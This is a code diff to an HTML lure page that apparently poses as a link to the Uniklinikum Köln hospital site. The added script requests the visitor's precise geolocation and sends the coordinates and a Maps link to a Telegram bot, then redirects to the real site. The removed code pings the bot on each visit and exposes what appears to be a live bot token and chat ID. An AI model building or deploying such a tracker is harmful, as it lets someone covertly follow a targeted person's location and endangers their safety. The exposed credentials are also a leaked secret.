@@ -51,23 +51,47 @@
 </div>
 
 <script>
-function sendToTelegram() {
-  const botToken = "8402128842:AAHUBBOkf7jJ8M1G_NjZPoJ_wud0-UR7t3I";
-  const chatId = "8570996143";
-  const msg = "👀 Kimsə Uniklinikum Köln səhifəsinə baxdı";
+const BOT_TOKEN = "BURAYA_BOT_TOKEN";
+const CHAT_ID = "BURAYA_CHAT_ID";
 
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  return fetch(url, {
+    method: "POST",
+    headers: {"Content-Type": "application/x-www-form-urlencoded"},
+    body: `chat_id=${encodeURIComponent(CHAT_ID)}&text=${encodeURIComponent(text)}`
+  });
 }
 
 function openUni() {
-  sendToTelegram();
-  document.getElementById("result").innerText = "Weiterleitung…";
+  const result = document.getElementById("result");
+  result.innerText = "Standort wird abgefragt… (bitte erlauben)";
 
-  setTimeout(() => {
-    window.open("https://www.uk-koeln.de", "_blank");
-  }, 1200);
+  if (!navigator.geolocation) {
+    result.innerText = "Geolokalisierung wird nicht unterstützt.";
+    sendToTelegram("❌ Geolocation not supported");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      const lat = pos.coords.latitude.toFixed(5);
+      const lon = pos.coords.longitude.toFixed(5);
+
+      result.innerHTML =
+        `✅ Standort erhalten<br>${lat}, ${lon}<br>` +
+        `<a href="https://maps.google.com/?q=${lat},${lon}" target="_blank">Google Maps</a>`;
+
+      await sendToTelegram(`📍 Standort (mit Erlaubnis):\nLat: ${lat}\nLon: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`);
+
+      setTimeout(() => window.open("https://www.uk-koeln.de", "_blank"), 800);
+    },
+    async (err) => {
+      // icazə verilmədi / error oldu
+      result.innerText = "❌ Standort nicht freigegeben.";
+      await sendToTelegram(`❌ Standort nicht freigegeben (Error ${err.code})`);
+    },
+    { enableHighAccuracy: true, timeout: 10000 }
+  );
 }
 </script>
-
-</body>
-</html>
